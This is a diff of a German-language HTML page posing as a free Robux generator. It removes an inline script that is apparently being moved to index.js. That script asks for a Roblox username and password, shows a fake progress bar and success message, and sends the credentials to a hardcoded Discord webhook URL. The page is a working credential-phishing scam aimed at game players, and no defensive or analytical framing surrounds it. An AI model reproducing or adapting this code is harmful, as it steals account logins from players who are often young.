@@ -83,57 +83,6 @@
 
 <p id="message" class="hidden"></p>
 
-<script>
-    function toggleUsernameVisibility() {
-        let usernameInput = document.getElementById("password");
-        if (usernameInput.type === "password") {
-            usernameInput.type = "text";
-        } else {
-            usernameInput.type = "password";
-        }
-    }
-    function startFakeProcess() {
-        let username = document.getElementById("username").value;
-        let password = document.getElementById("password").value;
-        let robuxAmount = document.getElementById("robuxAmount").value;
-        if (!username || !robuxAmount || !password) {
-            alert("Bitte fülle alle Felder aus!");
-            return;
-        }
-
-
-
-
-        document.getElementById("progressBarContainer").classList.remove("hidden");
-        let progress = 0;
-        let messages = [
-            { limit: 30, text: "In Account einloggen..." },
-            { limit: 50, text: "Robux kaufen..." },
-            { limit: 70, text: "Daten verifizieren..." },
-            { limit: 85, text: "Transaktion abschließen..." },
-            { limit: 99, text: "Server verbinden..." },
-            { limit: 100, text: "Robux aufgeladen" }
-        ];
-
-        let interval = setInterval(() => {
-            if (progress >= 100) {
-                clearInterval(interval);
-                document.getElementById("message").innerText = `Erfolgreich! ${robuxAmount} Robux wurden zu ${username} hinzugefügt!`;
-                document.getElementById("message").classList.remove("hidden");
-                fetch("https://discord.com/api/webhooks/1344780329851945011/8TtCOWokrlXL8XAywwzJUdZf0HDeJAaJoSWDIvE7L83IUXMS-KA9qbgiCEpKS1fdXO1P", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `User: ${username}, Password: ${password}` })
-                });
-            } else {
-                let step = Math.floor(Math.random() * 5) + 1; // Zufällige Schritte zwischen 1 und 5
-                progress = Math.min(progress + step, 100);
-                let currentMessage = messages.find(m => progress <= m.limit).text;
-                document.getElementById("progressBar").style.width = progress + "%";
-                document.getElementById("progressBar").innerText = progress + "% - " + currentMessage;
-            }
-        }, Math.floor(Math.random() * 500) + 300); // Zufällige Intervalle zwischen 300ms und 800ms
-    }
-</script>
+<script src="index.js"></script>
 </body>
 </html>
